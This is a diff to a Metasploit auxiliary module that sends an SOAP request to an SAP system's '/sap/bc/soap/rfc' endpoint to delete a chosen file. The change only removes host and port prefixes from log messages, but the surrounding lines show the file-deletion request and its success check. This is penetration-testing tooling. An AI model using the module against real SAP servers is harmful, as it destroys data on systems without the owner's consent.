@@ -77,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
     data << '</SOAP-ENV:Envelope>'
 
     begin
-      vprint_status("#{rhost}:#{rport} - Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}")
+      vprint_status("Sending request to delete #{datastore['FILENAME']} at #{datastore['DIRNAME']}")
       res = send_request_cgi({
         'uri' => '/sap/bc/soap/rfc',
         'method' => 'POST',
@@ -95,14 +95,14 @@ class MetasploitModule < Msf::Auxiliary
       })
 
       if res && (res.code == 200) && res.body =~ (/EPS_DELETE_FILE.Response/) && res.body.include?(datastore['FILENAME']) && res.body.include?(datastore['DIRNAME'])
-        print_good("#{rhost}:#{rport} - File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
+        print_good("File #{datastore['FILENAME']} at #{datastore['DIRNAME']} successfully deleted")
       elsif res
-        vprint_error("#{rhost}:#{rport} - Response code: " + res.code.to_s)
-        vprint_error("#{rhost}:#{rport} - Response message: " + res.message.to_s)
-        vprint_error("#{rhost}:#{rport} - Response body: " + res.body.to_s) if res.body
+        vprint_error("Response code: " + res.code.to_s)
+        vprint_error("Response message: " + res.message.to_s)
+        vprint_error("Response body: " + res.body.to_s) if res.body
       end
     rescue ::Rex::ConnectionError
-      print_error("#{rhost}:#{rport} - Unable to connect")
+      print_error("Unable to connect")
       return
     end
   end
